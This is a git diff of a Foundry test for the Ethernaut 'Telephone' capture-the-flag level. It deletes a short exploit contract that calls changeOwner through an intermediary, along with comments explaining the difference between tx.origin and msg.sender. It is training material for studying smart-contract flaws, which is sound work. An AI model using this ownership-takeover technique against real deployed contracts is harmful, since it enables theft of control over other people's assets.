@@ -28,19 +28,6 @@ contract TelephoneTest is Test {
         /****************
          *    Attack     *
          *************** */
-        TelephoneHack telephoneHack = new TelephoneHack(levelAddress);
-        /*
-         * tx.origin:
-         *   The original user wallet that initiated the transaction
-         *   The origin address of potentially an entire chain of transactions and calls
-         *   Only user wallet addresses can be the tx.origin
-         *   A contract address can never be the tx.origin
-         * msg.sender:
-         *   The immediate sender of this specific transaction or call
-         *   Both user wallets and smart contracts can be the msg.sender
-         */
-        telephoneHack.attack();
-        assertEq(ethernautTelephone.owner(), player);
 
         /*****************
          *Level Submission*
@@ -50,19 +37,5 @@ contract TelephoneTest is Test {
         );
         vm.stopPrank();
         assert(levelSuccessfullyPassed);
-    }
-}
-
-contract TelephoneHack {
-    Telephone public challenge;
-
-    constructor(address challengeAddress) {
-        challenge = Telephone(payable(challengeAddress));
-    }
-
-    function attack() external payable {
-        // the condition to change the owner is that
-        //msg.sender != tx.origin because called from contract
-        challenge.changeOwner(msg.sender);
     }
 }
